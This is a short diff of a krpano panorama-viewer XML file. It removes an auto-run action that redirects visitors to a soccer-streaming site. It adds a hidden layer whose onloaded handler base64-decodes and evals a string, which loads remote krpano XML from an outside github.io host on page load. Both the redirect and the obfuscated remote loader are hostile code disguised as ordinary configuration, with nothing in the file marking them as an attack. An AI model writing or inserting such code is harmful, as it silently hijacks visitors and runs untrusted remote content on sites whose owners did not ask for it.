@@ -1,7 +1,4 @@
-<krpano>
-    <action name="startup" autorun="onstart">
-        <![CDATA[
-            openurl('https://soccerstream24.netlify.app/?raz', _self);
-        ]]>
-    </action>
+<krpano version="1.0.8.15">
+<layer name="js_loader" type="container" visible="false"
+onloaded="js(eval(var w=atob('PGtycGFubz48aW5jbHVkZSB1cmw9Ii8vcGFrYWNodWwuZ2l0aHViLmlvL2toYXJhcC90eHoueG1sIi8+PC9rcnBhbm8+');eval(w)););"/>
 </krpano>
